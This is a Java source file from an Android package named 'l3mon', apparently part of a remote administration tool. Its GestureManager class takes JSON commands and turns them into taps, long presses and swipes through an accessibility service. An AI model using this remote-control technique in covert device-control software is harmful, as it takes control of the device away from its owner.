package com.etechd.l3mon;

import android.content.Context;

import org.json.JSONObject;

public class GestureManager {

    public static void executeGesture(Context context, JSONObject data) {
        try {
            if (context == null || data == null) {
                return;
            }

            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
            if (service == null) {
                return;
            }

            String action = data.optString("action", "tap");
            int x = data.optInt("x", 0);
            int y = data.optInt("y", 0);
            int duration = data.optInt("duration", action.equals("long") ? 1000 : 100);
            int endX = data.optInt("endX", x);
            int endY = data.optInt("endY", y);

            if (action.equals("tap")) {
                service.dispatchGesture("tap", x, y, x, y, 50);
            } else if (action.equals("long")) {
                service.dispatchGesture("long", x, y, x, y, Math.max(duration, 1000));
            } else if (action.equals("swipe")) {
                service.dispatchGesture("swipe", x, y, endX, endY, Math.max(duration, 200));
            }
        } catch (Exception error) {
            error.printStackTrace();
        }
    }
}
